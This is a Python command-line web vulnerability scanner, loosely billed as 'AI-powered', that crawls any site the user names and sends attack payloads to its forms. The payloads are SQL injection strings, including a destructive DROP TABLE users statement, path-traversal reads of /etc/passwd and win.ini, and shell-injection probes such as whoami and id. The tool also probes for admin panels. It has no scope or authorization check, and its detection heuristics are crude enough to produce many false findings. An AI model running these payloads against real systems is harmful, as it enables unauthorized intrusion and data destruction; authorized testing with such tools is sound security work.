# Ultimate AI-Powered Vulnerability Scanner (PentestGPT Style)
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import time
import json
import os
from rich.console import Console
from rich.table import Table
from rich.progress import track
from colorama import init, Fore

init(autoreset=True)
console = Console()
visited_urls = set()
vulnerability_log = []

def banner():
    art = """
█▀▀ █░█ █▀█ █▀█ █▄░█   █▀▄ █░█ █▀▄ █░█
█▄▄ █▄█ █▄█ █▀▄ █░▀█   █▄▀ █▄█ █▄▀ █▄█
AI SECURITY ASSISTANT | OWNER ABHI
"""
    for line in art.splitlines():
        print(Fore.CYAN + line)
        time.sleep(0.03)

def is_internal_url(url, domain):
    return url.startswith(domain) and url not in visited_urls

def crawl(base_url):
    domain = "{uri.scheme}://{uri.netloc}".format(uri=urlparse(base_url))
    queue = [base_url]
    found_urls = []

    while queue:
        url = queue.pop(0)
        visited_urls.add(url)
        try:
            res = requests.get(url, timeout=5)
            soup = BeautifulSoup(res.text, 'html.parser')
            found_urls.append(url)

            for tag in soup.find_all("a", href=True):
                full_url = urljoin(url, tag['href'])
                if is_internal_url(full_url, domain):
                    queue.append(full_url)
        except:
            continue

    return found_urls

def scan_for_forms(url):
    try:
        res = requests.get(url, timeout=5)
        soup = BeautifulSoup(res.text, "html.parser")
        return soup.find_all("form")
    except:
        return []

def detect_sql_injection(url, form):
    vulnerable = False
    payloads = ["' OR '1'='1", "' OR sleep(5)--", "'; DROP TABLE users;--"]
    inputs = form.find_all("input")
    action = form.get("action")
    method = form.get("method", "get").lower()
    for payload in payloads:
        data = {i.get("name"): payload for i in inputs if i.get("name")}
        full_url = urljoin(url, action)
        try:
            if method == "post":
                res = requests.post(full_url, data=data, timeout=10)
            else:
                res = requests.get(full_url, params=data, timeout=10)
            if "sql" in res.text.lower() or "syntax" in res.text.lower() or payload in res.text:
                vulnerable = True
                log_vulnerability(full_url, payload, "SQL Injection", "HIGH",
                                  "Use parameterized queries to prevent SQL injection.")
        except:
            continue
    return vulnerable

def detect_lfi(url, form):
    lfi_payloads = ["../../../../etc/passwd", "..\..\..\..\windows\win.ini"]
    inputs = form.find_all("input")
    action = form.get("action")
    method = form.get("method", "get").lower()
    for payload in lfi_payloads:
        data = {i.get("name"): payload for i in inputs if i.get("name")}
        full_url = urljoin(url, action)
        try:
            if method == "post":
                res = requests.post(full_url, data=data, timeout=5)
            else:
                res = requests.get(full_url, params=data, timeout=5)
            if "root:x:" in res.text or "[extensions]" in res.text:
                log_vulnerability(full_url, payload, "Local File Inclusion (LFI)", "HIGH",
                                  "Sanitize file paths and avoid direct file parameter usage.")
        except:
            continue

def detect_command_injection(url, form):
    payloads = ["; whoami", "&& id", "| uname -a"]
    inputs = form.find_all("input")
    action = form.get("action")
    method = form.get("method", "get").lower()
    for payload in payloads:
        data = {i.get("name"): payload for i in inputs if i.get("name")}
        full_url = urljoin(url, action)
        try:
            if method == "post":
                res = requests.post(full_url, data=data, timeout=5)
            else:
                res = requests.get(full_url, params=data, timeout=5)
            if any(k in res.text for k in ["uid=", "root", "Linux", "Windows"]):
                log_vulnerability(full_url, payload, "Command Injection", "CRITICAL",
                                  "Never execute raw input in shell. Use subprocess safely.")
        except:
            continue

def detect_headers(url):
    try:
        res = requests.get(url, timeout=5)
        missing = []
        required = ["X-Frame-Options", "X-XSS-Protection", "Content-Security-Policy", "Strict-Transport-Security"]
        for header in required:
            if header not in res.headers:
                missing.append(header)
        if missing:
            log_vulnerability(url, "N/A", "Missing Security Headers", "MEDIUM",
                              f"Missing headers: {', '.join(missing)}. Add via server config.")
    except:
        pass

def detect_admin_panels(base_url):
    common = ["/admin", "/cpanel", "/dashboard", "/manage", "/config"]
    for path in common:
        url = urljoin(base_url, path)
        try:
            res = requests.get(url, timeout=5)
            if res.status_code == 200:
                log_vulnerability(url, "N/A", "Exposed Admin Panel", "HIGH",
                                  "Restrict admin access with auth and IP whitelisting.")
        except:
            continue

def log_vulnerability(url, payload, vtype, severity, fix):
    vulnerability_log.append({
        "url": url,
        "payload": payload,
        "type": vtype,
        "severity": severity,
        "fix": fix
    })
    console.print(f"[bold red]⚠️ {vtype} detected on {url} | Severity: {severity}[/bold red]")

def show_report():
    table = Table(title="🛡️ AI Vulnerability Summary", show_lines=True)
    table.add_column("Type", style="magenta")
    table.add_column("URL", style="cyan")
    table.add_column("Payload", style="yellow")
    table.add_column("Severity", style="red")
    for v in vulnerability_log:
        table.add_row(v["type"], v["url"], v["payload"], v["severity"])
    console.print(table)

def save_report():
    with open("ai_critical_report.json", "w") as f:
        json.dump(vulnerability_log, f, indent=2)
    console.print("[green]✅ Report saved as ai_critical_report.json[/green]")

def assistant():
    while True:
        console.print("""
[bold blue]
[1] Crawl and Scan Full Site
[2] Scan Specific Page
[3] Show AI Vulnerability Report
[4] Save Report
[5] Exit
[/bold blue]
""")
        choice = input(Fore.YELLOW + ">> What would you like to do? ")
        if choice == "1":
            target = input(Fore.GREEN + "Enter base URL (e.g., http://localhost:8080): ")
            urls = crawl(target)
            detect_admin_panels(target)
            for link in urls:
                forms = scan_for_forms(link)
                for form in forms:
                    detect_sql_injection(link, form)
                    detect_lfi(link, form)
                    detect_command_injection(link, form)
                detect_headers(link)
        elif choice == "2":
            url = input("Enter page URL: ")
            forms = scan_for_forms(url)
            for form in forms:
                detect_sql_injection(url, form)
                detect_lfi(url, form)
                detect_command_injection(url, form)
            detect_headers(url)
        elif choice == "3":
            show_report()
        elif choice == "4":
            save_report()
        elif choice == "5":
            console.print("[bold yellow]Goodbye, ethical hacker![/bold yellow]")
            break
        else:
            console.print("[red]Invalid choice. Try again.[/red]")

if __name__ == "__main__":
    os.system("clear" if os.name == "posix" else "cls")
    banner()
    assistant()
